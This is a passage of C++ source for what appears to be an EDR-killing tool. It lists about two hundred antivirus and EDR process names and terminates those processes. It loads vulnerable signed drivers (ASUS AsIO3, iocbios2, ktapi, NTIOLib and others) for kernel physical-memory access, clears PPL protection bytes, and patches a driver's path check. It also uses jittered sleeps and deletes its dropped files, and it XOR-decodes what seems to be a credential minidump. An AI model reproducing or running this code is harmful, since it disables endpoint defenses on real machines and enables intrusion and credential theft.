    "afwServ.exe","aswEngSrv.exe","aswidsagent.exe","aswToolsSvc.exe",
    "AvastSvc.exe","AvastUI.exe","bccavsvc.exe","wsc_proxy.exe",
    "AVGUI.exe","AVGSvc.exe","avgnt.exe","avgsvca.exe","avgToolsSvc.exe",
    "BinaryDefenseAgent.exe",
    "Arrakis3.exe","BDAvScanner.exe","BDFsTray.exe","BDFileServer.exe","BDLived2.exe",
    "BDLogger.exe","BDScheduler.exe","BDStatistics.exe","bdagent.exe","bdemsrv.exe",
    "bdntwrk.exe","bdredline.exe","bdregsvr2.exe","bdservicehost.exe",
    "BlumiraAgent.exe",
    "cb.exe","cbcomms.exe","cbdefense.exe","carbonsensor.exe","RepMgr.exe",
    "cfrutil.exe","cisco_amp_connector.exe","immunet.exe",
    "CSFalconContainer.exe","CSFalconService.exe","CSFalconUI.exe",
    "csfalcondataprotect.exe","REPRSVC.EXE",
    "CynetEPS.exe","CynetMS.exe","CynetSvc.exe",
    "ActiveConsole.exe","cybereason.exe","CybereasonActiveProbe.exe","CybereasonCR.exe",
    "CylanceSvc.exe",
    "DarktraceTSA.exe",
    "DeepInstinct.exe","DeepInstinctService.exe","DIAgentService.exe",
    "elastic-endpoint.exe","elastic-agent.exe","a2guard.exe","a2service.exe",
    "eamonm.exe","eamsi.exe","ecls.exe","efwd.exe","egui.exe","eguiProxy.exe",
    "ekrn.exe","ekrnEpfw.exe","ERAAgent.exe","EraAgentSvc.exe",
    "firesvc.exe","firetray.exe","FortiTray.exe","fortiedr.exe",
    "HeimdalsecurityAgent.exe",
    "HuntressAgent.exe","HuntressRMM.exe",
    "avp.exe","avpsus.exe","avpui.exe","kavfs.exe","kavfsscs.exe","kavfswh.exe",
    "kavfswp.exe","kavtray.exe","klactprx.exe","klcsldcl.exe","klcsweb.exe",
    "klnagent.exe","klnagchk.exe","klscctl.exe","klserver.exe","klwtblfs.exe",
    "kpf4ss.exe","ksde.exe","ksdeui.exe","vapm.exe",
    "masvc.exe","macmnsvc.exe","McAfeeAgent.exe","mcshield.exe","mfeann.exe",
    "mfevtps.exe","mfetp.exe","mfeepehost.exe","mfefire.exe","mfemactl.exe",
    "mfemacsvc.exe","mfemgr.exe","mfemms.exe","MgntSvc.exe","tepfsvc.exe",
    "MSASCui.exe","MSASCuiL.exe","MpDefenderCoreService.exe","MsMpEng.exe",
    "MsMpSvc.exe","MsSense.exe","msseces.exe","NisSrv.exe","SecurityHealthService.exe",
    "SenseCncProxy.exe","SenseIR.exe","SenseNdr.exe","SenseSampleUploader.exe",
    "smartscreen.exe","windefend.exe","WinDefend.exe",
    "MorphisecService.exe",
    "ccApp.exe","ccSvcHst.exe","ns.exe","nsservice.exe","nortonsecurity.exe",
    "rtvscan.exe","SepMasterService.exe","sepWscSvc64.exe","smc.exe","SmcGui.exe",
    "ossec-agent.exe","wazuh-agent.exe",
    "cortexService.exe","trapsagent.exe","trapsd.exe","Traps.exe",
    "qualys-cloud-agent.exe","QualysAgent.exe",
    "ir_agent.exe","rapid7_endpoint.exe",
    "RedCanaryAgent.exe",
    "SangforAgent.exe","SangforEDR.exe","SangforMonitor.exe","SangforProtect.exe","SangforService.exe",
    "Sentinel.exe","SentinelAgent.exe","SentinelAgentWorker.exe","SentinelCtl.exe",
    "SentinelHelperService.exe","SentinelMemoryScanner.exe","SentinelServiceHost.exe",
    "SentinelStaticEngine.exe","SentinelUI.exe",
    "SonicWallClientProtectionService.exe","swc_service.exe",
    "hmpalert.exe","McsAgent.exe","McsClient.exe","SavApi.exe","SAVAdminService.exe",
    "SAVService.exe","SEDService.exe","SophosClean.exe","SophosHealth.exe",
    "SophosLiveQueryService.exe","SophosMTR.exe","SophosNetFilter.exe",
    "SophosNtpService.exe","SophosOsquery.exe","SophosUI.exe","SophosUpdateMgr.exe",
    "TaniumClient.exe","TaniumCX.exe","tanclient.exe",
    "ThreatLockerConsent.exe","threatlockerservice.exe","threatlockertray.exe",
    "coreFrameworkHost.exe","coreServiceShell.exe","NTRTScan.exe","ntrtscan.exe",
    "OfcService.exe","PccNTMon.exe","TMBMSRV.exe","TmListen.exe","TmPfw.exe",
    "VectorAgent.exe","UptycsAgent.exe",
    "wlcsservice.exe",
    "WRSA.exe","WRSkyClient.exe","WRSVC.exe",
    "Sysmon.exe","Sysmon64.exe",
    "zlclient.exe",
    nullptr
};

static int CountRunning(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int count = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) count++;
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return count;
}

static void KillEdrs() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int attempted = 0, killed = 0, denied = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        for (int i = 0; kEdrProcs[i]; i++) {
            if (_stricmp(nm, kEdrProcs[i]) == 0) {
                attempted++;
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) {
                    if (TerminateProcess(h, 1)) {
                        printf("[+] Killed %s (PID %lu)\n", nm, pe.th32ProcessID);
                        killed++;
                    } else {
                        printf("[-] TerminateProcess %s (PID %lu) failed (%lu) - PPL strip may have failed\n",
                               nm, pe.th32ProcessID, GetLastError());
                        denied++;
                    }
                    CloseHandle(h);
                } else {
                    printf("[-] OpenProcess %s (PID %lu) failed (%lu)\n",
                           nm, pe.th32ProcessID, GetLastError());
                    denied++;
                }
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    printf("[*] %d EDR process(es) attempted: %d killed, %d denied\n", attempted, killed, denied);
    if (denied > 0)
        printf("[!] %d kill(s) denied - PPL strip likely failed or HVCI active\n", denied);
}

static bool KillSpecificPid(QWORD sysEproc, DWORD pid) {
    char nm[16]{};
    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
    if (ep) {
        BYTE before = 0; KRead(ep + g_off.Protection, &before, 1);
        if (before != 0) {
            printf("[*] %s (PID %lu) Protection=0x%02X, stripping...\n", nm, pid, before);
            BYTE zero = 0;
            if (!KWrite(ep + g_off.Protection, &zero, 1)) {
                printf("[-] KWrite Protection failed\n");
            } else {
                BYTE after = 0xFF; KRead(ep + g_off.Protection, &after, 1);
                printf("[+] Protection cleared: 0x%02X -> 0x%02X\n", before, after);
            }
        }
    } else {
        printf("[!] PID %lu EPROCESS not found (may not have PPL)\n", pid);
    }

    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) { printf("[-] OpenProcess PID %lu failed (%lu)\n", pid, GetLastError()); return false; }
    if (!TerminateProcess(h, 1)) {
        printf("[-] TerminateProcess PID %lu failed (%lu)\n", pid, GetLastError());
        CloseHandle(h);
        return false;
    }
    CloseHandle(h);

    Sleep(300);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    bool still_alive = false;
    if (snap != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(snap, &pe)) do {
            if (pe.th32ProcessID == pid) { still_alive = true; break; }
        } while (Process32NextW(snap, &pe));
        CloseHandle(snap);
    }
    if (still_alive) {
        printf("[-] PID %lu still alive after TerminateProcess\n", pid);
        return false;
    }
    printf("[+] PID %lu terminated and confirmed dead\n", pid);
    return true;
}

static bool DecodeFile(const char* inPath, const char* outPath, BYTE xorKey = 0x55) {
    HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) { printf("[-] Open %s failed (%lu)\n", inPath, GetLastError()); return false; }
    DWORD sz = GetFileSize(f, nullptr);
    if (sz == INVALID_FILE_SIZE || sz == 0) { printf("[-] GetFileSize failed\n"); CloseHandle(f); return false; }
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { printf("[-] VirtualAlloc failed\n"); CloseHandle(f); return false; }
    DWORD got = 0;
    ReadFile(f, buf, sz, &got, nullptr);
    CloseHandle(f);
    for (DWORD i = 0; i < sz; i++) buf[i] ^= xorKey;
    if (sz >= 4 && buf[0]=='M' && buf[1]=='D' && buf[2]=='M' && buf[3]=='P')
        printf("[+] MDMP signature OK\n");
    else
        printf("[!] MDMP signature not found\n");
    HANDLE o = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD w = 0;
    WriteFile(o, buf, sz, &w, nullptr);
    CloseHandle(o);
    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[+] Decoded to %s (%lu bytes)\n", outPath, sz);
    return true;
}

static void JitteredSleep(DWORD base_ms) {
    BYTE rnd = 0;
    HCRYPTPROV prov = 0;
    if (CryptAcquireContextW(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(prov, 1, &rnd);
    if (prov) CryptReleaseContext(prov, 0);
    DWORD jitter = (DWORD)(base_ms * 0.4 * ((int)rnd - 128) / 128);
    Sleep(base_ms + jitter);
}

static void ListProcs(QWORD sysEproc) {
    printf("%-8s  %-20s  %s\n", "PID", "Name", "Protection");
    printf("%-8s  %-20s  %s\n", "---", "----", "----------");
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD pid = KReadQword(ep + g_off.UniqueProcessId);
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15); nm[15] = 0;
        BYTE prot = 0;
        KRead(ep + g_off.Protection, &prot, 1);
        if (prot)
            printf("%-8llu  %-20s  0x%02X (PPL)\n", pid, nm, prot);
        else
            printf("%-8llu  %-20s\n", pid, nm);
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
}

static bool TestRw(QWORD sysEproc) {
    printf("[test] Reading System EPROCESS at 0x%llX\n", sysEproc);
    BYTE block[32]{};
    if (!KRead(sysEproc, block, sizeof(block))) {
        printf("[-] KRead System EPROCESS failed\n");
        return false;
    }
    printf("[+] KRead OK. First 16 bytes: ");
    for (int i = 0; i < 16; i++) printf("%02X ", block[i]);
    printf("\n");
    BYTE name[16]{};
    if (KRead(sysEproc + g_off.ImageFileName, name, 15))
        printf("[+] System EPROCESS ImageFileName: %s\n", (char*)name);
    QWORD pid4 = KReadQword(sysEproc + g_off.UniqueProcessId);
    printf("[+] System PID from EPROCESS: %llu (expect 4)\n", pid4);
    printf("[+] R/W test PASSED\n");
    return true;
}

static QWORD FindDriverBaseByServiceName(const std::wstring& svcName) {
    std::string svcA = WideToUtf8(svcName);
    LPVOID drvs[1024]; DWORD cb = 0;
    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
    int n = cb / sizeof(LPVOID);
    for (int i = 0; i < n; i++) {
        char nm[MAX_PATH]{};
        GetDeviceDriverBaseNameA(drvs[i], nm, sizeof(nm));
        std::string nmStr(nm);
        auto dot = nmStr.rfind('.');
        std::string base = (dot != std::string::npos) ? nmStr.substr(0, dot) : nmStr;
        if (_stricmp(base.c_str(), svcA.c_str()) == 0)
            return (QWORD)drvs[i];
    }
    return 0;
}

static QWORD FindAsIO3BaseBySignature() {
    LPVOID drvs[1024]; DWORD cb = 0;
    if (!EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
    int n = cb / sizeof(LPVOID);
    for (int i = 0; i < n; i++) {
        QWORD base = (QWORD)drvs[i];
        if (!base || base < 0xFFFF000000000000ULL) continue;
        QWORD va = base + 0x2701;
        QWORD pa = IocDrv_Va2Pa(va);
        if (!pa) continue;
        BYTE sig[6]{};
        if (!IocDrv_PhysRead(pa, sig, 6)) continue;
        if (sig[0]==0x84 && sig[1]==0xC0 && sig[2]==0x75 &&
            sig[3]==0x12 && sig[4]==0x8B && sig[5]==0x43) {
            char nm[MAX_PATH]{};
            GetDeviceDriverBaseNameA(drvs[i], nm, sizeof(nm));
            printf("[+] AsIO3 found by signature at 0x%llX (%s)\n", base, nm);
            return base;
        }
    }
    return 0;
}

static bool AsIO3_PatchPathCheck(const Config& cfg, const std::wstring& asio3SvcName) {
    printf("[*] AsIO3 kernel patch: loading secondary driver for physical R/W...\n");

    std::wstring pWide = Utf8ToWide(cfg.patchDrvPath);
    std::wstring pDropped;
    if (!CopyDriverToTemp(pWide, pDropped)) return false;
    std::wstring pSvc = SvcNameFromPath(pDropped);
    std::wstring pReg = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + pSvc;

    auto pCleanup = [&]() {
        UnloadDriverViaNt(pReg);
        DeleteServiceKey(pSvc);
        JitteredSleep(200);
        DeleteFileW(pDropped.c_str());
    };

    if (!CreateDriverService(pSvc, pDropped)) {
        DeleteFileW(pDropped.c_str());
        return false;
    }
    if (!LoadDriverViaNt(pReg)) {
        DeleteServiceKey(pSvc);
        DeleteFileW(pDropped.c_str());
        return false;
    }
    JitteredSleep(400);

    std::wstring devName = L"\\\\.\\iocbios2";
    if (cfg.patchDrvType == "biostool")     devName = L"\\\\.\\ASUSBIOSIO";
    else if (cfg.patchDrvType == "asusbiosio") devName = L"\\\\.\\ASUSBIOSIO";
    else if (cfg.patchDrvType == "ktapi")   devName = L"\\\\.\\ktapi";
    else if (cfg.patchDrvType == "asmio")   devName = L"\\\\.\\ASMIO";

    HANDLE pDev = CreateFileW(devName.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (pDev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open patch driver device %s (%lu)\n",
               WideToUtf8(devName).c_str(), GetLastError());
        pCleanup();
        return false;
    }
    printf("[+] Patch driver device opened\n");

    bool result = false;
    if (cfg.patchDrvType == "iocdrv" || cfg.patchDrvType.empty()) {
        HANDLE saveDev = g_iocDev;
        QWORD  saveCr3 = g_iocCr3;
        g_iocDev = pDev;

        printf("[*] Bootstrapping CR3 via patch driver (PML4 scan)...\n");
        g_iocCr3 = IocDrv_FindCr3();
        if (!g_iocCr3) {
            printf("[-] CR3 not found via patch driver\n");
            g_iocDev = saveDev; g_iocCr3 = saveCr3;
            CloseHandle(pDev); pCleanup();
            return false;
        }
        printf("[+] CR3: 0x%llX\n", g_iocCr3);

        QWORD asio3Base = FindDriverBaseByServiceName(asio3SvcName);
        if (!asio3Base) {
            printf("[*] Service-name lookup missed — scanning all modules for AsIO3 signature...\n");
            asio3Base = FindAsIO3BaseBySignature();
        }
        if (!asio3Base) {
            printf("[-] Cannot locate AsIO3 kernel base\n");
            g_iocDev = saveDev; g_iocCr3 = saveCr3;
            CloseHandle(pDev); pCleanup();
            return false;
        }

        QWORD patchVA = asio3Base + 0x2703;
        printf("[*] Patch target VA: 0x%llX (JNE→JMP at RVA 0x2703)\n", patchVA);

        QWORD patchPA = IocDrv_Va2Pa(patchVA);
        if (!patchPA) {
            printf("[-] VA→PA failed for 0x%llX\n", patchVA);
            g_iocDev = saveDev; g_iocCr3 = saveCr3;
            CloseHandle(pDev); pCleanup();
            return false;
        }
        printf("[+] Patch site PA: 0x%llX\n", patchPA);

        BYTE orig = 0;
        IocDrv_PhysRead(patchPA, &orig, 1);
        printf("[*] Current byte at RVA 0x2703: 0x%02X (expect 0x75 JNE)\n", orig);

        if (orig == 0xEB) {
            printf("[+] AsIO3 path check already patched (0xEB JMP)\n");
            result = true;
        } else {
            BYTE pb = 0xEB;
            result = IocDrv_PhysWrite(patchPA, &pb, 1);
            BYTE verify = 0;
            IocDrv_PhysRead(patchPA, &verify, 1);
            result = result && (verify == 0xEB);
            printf("[%s] Patch verify byte: 0x%02X (expect 0xEB)\n",
                   result ? "+" : "-", verify);
        }

        g_iocDev = saveDev;
        g_iocCr3 = saveCr3;
    } else if (cfg.patchDrvType == "asmio") {
        {
            struct { QWORD pa; DWORD flags; } probes[] = {
                { 0x100000, 0 },   // 1MB, MmNonCached
                { 0x100000, 1 },   // 1MB, MmCached
                { 0x200000, 0 },   // 2MB, MmNonCached
            };
            for (auto& p : probes) {
                QWORD probe = 0; DWORD got = 0;
                AsmIoReadReq req{ p.pa, 8, p.flags };
                BOOL ok = DeviceIoControl(pDev, ASMIO_IOCTL_READ,
                    &req, sizeof(req), &probe, sizeof(probe), &got, nullptr);
                printf("[*] AsmIo probe PA=0x%llX flags=%lu: ok=%d got=%lu data=0x%016llX err=%lu\n",
                    p.pa, p.flags, (int)ok, got, probe, ok ? 0 : GetLastError());
                if (ok && got >= 8) break;  // found working config
            }
        }
        printf("[*] Bootstrapping CR3 via AsmIo (optimized PML4 scan)...\n");
        QWORD cr3 = AsmIo_FindCr3(pDev);
        if (!cr3) {
            printf("[-] CR3 not found via AsmIo\n");
            CloseHandle(pDev); pCleanup();
            return false;
        }
        printf("[+] CR3: 0x%llX\n", cr3);

        QWORD asio3Base = FindDriverBaseByServiceName(asio3SvcName);
        if (!asio3Base) {
            printf("[*] Service-name lookup missed — scanning all modules for AsIO3 signature...\n");
            asio3Base = FindAsIO3BaseBySignatureAsmIo(pDev, cr3);
        }
        if (!asio3Base) {
            printf("[-] Cannot locate AsIO3 kernel base\n");
            CloseHandle(pDev); pCleanup();
            return false;
        }

        QWORD patchVA = asio3Base + 0x2703;
        printf("[*] Patch target VA: 0x%llX (JNE→JMP at RVA 0x2703)\n", patchVA);

        QWORD patchPA = AsmIo_Va2Pa(pDev, cr3, patchVA);
        if (!patchPA) {
            printf("[-] VA→PA failed for 0x%llX\n", patchVA);
            CloseHandle(pDev); pCleanup();
            return false;
        }
        printf("[+] Patch site PA: 0x%llX\n", patchPA);

        BYTE orig = 0;
        AsmIo_PhysRead(pDev, patchPA, &orig, 1);
        printf("[*] Current byte at RVA 0x2703: 0x%02X (expect 0x75 JNE)\n", orig);

        if (orig == 0xEB) {
            printf("[+] AsIO3 path check already patched (0xEB JMP)\n");
            result = true;
        } else {
            result = AsmIo_PhysWrite1(pDev, patchPA, 0xEB);
            BYTE verify = 0;
            AsmIo_PhysRead(pDev, patchPA, &verify, 1);
            result = result && (verify == 0xEB);
            printf("[%s] Patch verify byte: 0x%02X (expect 0xEB)\n",
                   result ? "+" : "-", verify);
        }
    } else if (cfg.patchDrvType == "biostool") {
        HANDLE saveDev = g_biostoolDev;
        g_biostoolDev = pDev;

        QWORD asio3Base = FindDriverBaseByServiceName(asio3SvcName);
        if (!asio3Base) {
            printf("[*] Service-name lookup missed — scanning all modules for AsIO3 signature...\n");
            LPVOID drvs2[1024]; DWORD cb2 = 0;
            if (EnumDeviceDrivers(drvs2, sizeof(drvs2), &cb2)) {
                int n2 = cb2 / sizeof(LPVOID);
                for (int i = 0; i < n2 && !asio3Base; i++) {
                    QWORD base = (QWORD)drvs2[i];
                    if (!base || base < 0xFFFF000000000000ULL) continue;
                    PVOID pa2701 = BiosTool_Va2Pa((PVOID)(base + 0x2701));
                    if (!pa2701) continue;
                    BYTE sig[6]{};
                    if (!BiosTool_ReadPhys(pa2701, 6, sig)) continue;
                    if (sig[0]==0x84 && sig[1]==0xC0 && sig[2]==0x75 &&
                        sig[3]==0x12 && sig[4]==0x8B && sig[5]==0x43) {
                        char nm[MAX_PATH]{};
                        GetDeviceDriverBaseNameA(drvs2[i], nm, sizeof(nm));
                        printf("[+] AsIO3 found by signature at 0x%llX (%s)\n", base, nm);
                        asio3Base = base;
                    }
                }
            }
        }
        if (!asio3Base) {
            printf("[-] Cannot locate AsIO3 kernel base\n");
            g_biostoolDev = saveDev;
            CloseHandle(pDev); pCleanup();
            return false;
        }

        QWORD patchVA = asio3Base + 0x2703;
        printf("[*] Patch target VA: 0x%llX (JNE→JMP at RVA 0x2703)\n", patchVA);

        PVOID patchPA = BiosTool_Va2Pa((PVOID)patchVA);
        if (!patchPA) {
            printf("[-] VA→PA failed for 0x%llX\n", patchVA);
            g_biostoolDev = saveDev;
            CloseHandle(pDev); pCleanup();
            return false;
        }
        printf("[+] Patch site PA: 0x%llX\n", (QWORD)patchPA);

        BYTE orig = 0;
        BiosTool_ReadPhys(patchPA, 1, &orig);
        printf("[*] Current byte at RVA 0x2703: 0x%02X (expect 0x75 JNE)\n", orig);

        if (orig == 0xEB) {
            printf("[+] AsIO3 path check already patched (0xEB JMP)\n");
            result = true;
        } else {
            BYTE pb = 0xEB;
            result = BiosTool_WritePhys(patchPA, 1, &pb);
            BYTE verify = 0;
            BiosTool_ReadPhys(patchPA, 1, &verify);
            result = result && (verify == 0xEB);
            printf("[%s] Patch verify byte: 0x%02X (expect 0xEB)\n",
                   result ? "+" : "-", verify);
        }

        g_biostoolDev = saveDev;
    } else if (cfg.patchDrvType == "asusbiosio") {
        printf("[*] ABios probe (reading PA 0x1000)...\n");
        if (!ABios_Probe(pDev)) {
            printf("[-] ABios probe failed — IOCTL format mismatch or driver not ready\n");
            CloseHandle(pDev); pCleanup();
            return false;
        }
        printf("[+] ABios physical read probe OK\n");

        QWORD patchPA = ABios_FindAndPatchAsIO3(pDev, false);
        if (!patchPA) {
            printf("[-] AsIO3 signature not found in physical memory scan\n");
            CloseHandle(pDev); pCleanup();
            return false;
        }
        result = true;
    } else {
        printf("[!] patchDrvType '%s' not supported; use iocdrv, biostool, asmio, or asusbiosio\n",
               cfg.patchDrvType.c_str());
    }

    CloseHandle(pDev);
    pCleanup();
    return result;
}

static bool InitProvider(const Config& cfg) {
    HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
    g_NtLoadDriver     = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
    g_NtUnloadDriver   = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
    g_activeProvider   = cfg.type;

    if (cfg.type == ProviderType::PdfwKrnl) {
        g_pdfwDev = CreateFileW(L"\\\\.\\Global\\PdFwKrnl",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_pdfwDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open PdFwKrnl (%lu)\n", GetLastError()); return false;
        }
        printf("[+] PdFwKrnl opened\n");
        return true;
    }

    if (cfg.drvPath.empty()) {
        printf("[-] --driver path required\n"); return false;
    }
    if (!EnablePrivilege("SeLoadDriverPrivilege")) {
        printf("[-] SeLoadDriverPrivilege not available\n"); return false;
    }

    std::wstring widePath = Utf8ToWide(cfg.drvPath);

    if (!VerifyDriverHash(widePath, cfg.type, cfg.forceUnsafe)) {
        printf("[-] Driver hash verification failed. Aborting.\n");
        return false;
    }

    std::wstring dropped;
    if (!CopyDriverToTemp(widePath, dropped)) return false;

    printf("[*] Driver dropped to: %s\n", WideToUtf8(dropped).c_str());

    g_svcName  = SvcNameFromPath(dropped);
    g_regPath  = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + g_svcName;
    g_dropPath = dropped;

    if (!CreateDriverService(g_svcName, dropped)) return false;

    if (!LoadDriverViaNt(g_regPath)) {
        DeleteServiceKey(g_svcName);
        DeleteFileW(dropped.c_str());
        return false;
    }
    JitteredSleep(300);

    if (cfg.type == ProviderType::Ktapi) {
        g_ktapiDev = CreateFileW(L"\\\\.\\ktapi",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_ktapiDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open \\\\.\\ktapi (%lu)\n", GetLastError()); return false;
        }
        printf("[+] ktapi device opened\n");
        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
        g_ktapiCr3 = Ktapi_FindCr3();
        if (!g_ktapiCr3) {
            printf("[-] CR3 bootstrap failed - ktapi VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_ktapiCr3);
        return true;
    }

    if (cfg.type == ProviderType::IocDrv) {
        if (EnablePrivilege("SeDebugPrivilege"))
            printf("[+] SeDebugPrivilege enabled\n");
        else
            printf("[!] SeDebugPrivilege NOT enabled (err=%lu)\n", GetLastError());
        if (EnablePrivilege("SeSecurityPrivilege"))  // iocdrv also checks privilege 22
            printf("[+] SeSecurityPrivilege enabled\n");
        else
            printf("[!] SeSecurityPrivilege NOT enabled (err=%lu)\n", GetLastError());
        g_iocDev = CreateFileW(L"\\\\.\\iocbios2",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_iocDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open \\\\.\\iocbios2 (%lu)\n", GetLastError()); return false;
        }
        printf("[+] iocbios2 device opened\n");
        {
            BYTE probe[12] = {0};  // driver requires OutputBufferLength >= 12
            BOOL ok = FALSE;
            DWORD got = 0;
            IocReadReq req{ 0x1000, 4 };
            ok = DeviceIoControl(g_iocDev, IOCDRV_IOCTL_READ,
                &req, sizeof(req), probe, sizeof(probe), &got, nullptr);
            printf("[*] IOCTL probe PA=0x1000: ok=%d got=%lu data=0x%X err=%lu\n",
                (int)ok, got, *(DWORD*)probe, GetLastError());
        }
        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
        g_iocCr3 = IocDrv_FindCr3();
        if (!g_iocCr3) {
            printf("[-] CR3 bootstrap failed - iocdrv VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_iocCr3);
        return true;
    }

    if (cfg.type == ProviderType::AsIO3) {
        std::wstring asio3SvcName = g_svcName;
        Asio3_CreateSwwlEvent();
        g_asio3Dev = CreateFileW(L"\\\\.\\Asusgio3",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_asio3Dev == INVALID_HANDLE_VALUE) {
            g_asio3Dev = CreateFileW(L"\\\\?\\GLOBALROOT\\Device\\Asusgio3",
                GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        }

        if (g_asio3Dev == INVALID_HANDLE_VALUE && !cfg.patchDrvPath.empty()
            && GetLastError() == ERROR_ACCESS_DENIED) {
            printf("[*] Asusgio3 IRP_MJ_CREATE blocked (path/signature check). "
                   "Attempting kernel patch via secondary driver...\n");
            if (AsIO3_PatchPathCheck(cfg, asio3SvcName)) {
                printf("[*] Patch applied — retrying device open...\n");
                JitteredSleep(50);
                g_asio3Dev = CreateFileW(L"\\\\.\\Asusgio3",
                    GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                if (g_asio3Dev == INVALID_HANDLE_VALUE) {
                    g_asio3Dev = CreateFileW(L"\\\\?\\GLOBALROOT\\Device\\Asusgio3",
                        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                }
            }
        }

        if (g_asio3Dev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open Asusgio3 device (%lu)\n", GetLastError());
            printf("    Hint: run from %%PROGRAMFILES(X86)%%\\ASUS\\AsusCertService\\\n");
            printf("    Hint: --patch-driver <drv.sys> --patch-driver-type asusbiosio to bypass\n");
            return false;
        }
        printf("[+] Asusgio3 device opened\n");
        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
        g_asio3Cr3 = Asio3_FindCr3();
        if (!g_asio3Cr3) {
            printf("[-] CR3 bootstrap failed - asio3 VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_asio3Cr3);
        return true;
    }

    if (cfg.type == ProviderType::NTIOLib) {
        g_ntiolibDev = CreateFileW(L"\\\\.\\NTIOLib_MysticLight",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_ntiolibDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open NTIOLib_MysticLight (%lu)\n", GetLastError());
            return false;
        }
        printf("[+] NTIOLib_MysticLight device opened\n");
        if (!NTIOLib_Auth()) {
            printf("[-] NTIOLib auth IOCTL failed (%lu)\n", GetLastError());
            return false;
        }
        printf("[+] NTIOLib authenticated (magic 0x%X)\n", NTIOLIB_AUTH_MAGIC);
        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
        g_ntiolibCr3 = NTIOLib_FindCr3();
        if (!g_ntiolibCr3) {
            printf("[-] CR3 bootstrap failed - ntiolib VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_ntiolibCr3);
        return true;
    }

    if (cfg.type == ProviderType::RtsPpx) {
        g_rtsPpxDev = CreateFileW(L"\\\\.\\RtsPpx",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_rtsPpxDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open \\\\.\\RtsPpx (%lu)\n", GetLastError());
            return false;
        }
        printf("[+] RtsPpx device opened (handle=0x%p)\n", g_rtsPpxDev);

        // Probe: try reading BIOS ROM at 0xF0000 (always mapped, should be safe)
        printf("[*] Probing phys read at BIOS ROM 0xF0000...\n");
        BYTE probe[8]{};
